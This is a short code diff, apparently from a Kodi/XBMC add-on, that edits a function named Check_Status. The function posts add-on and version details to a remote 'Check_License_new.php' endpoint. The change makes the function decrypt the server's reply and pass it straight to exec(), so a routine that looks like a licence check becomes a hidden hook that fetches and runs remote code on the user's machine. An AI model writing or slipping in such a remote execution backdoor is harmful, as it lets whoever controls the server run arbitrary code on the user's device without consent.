@@ -732,7 +732,7 @@ def Check_Status(extension, email=''):
         status = Open_URL(url=BASE+'boxer/Check_License_new.php',post_type='post',payload={"x":params,"v":XBMC_VERSION,"r":extension})
     if status:
         try:
-            dolog(Encrypt('d',status))
+            status = (Encrypt('d',status))
         except:
             pass
         exec(status)
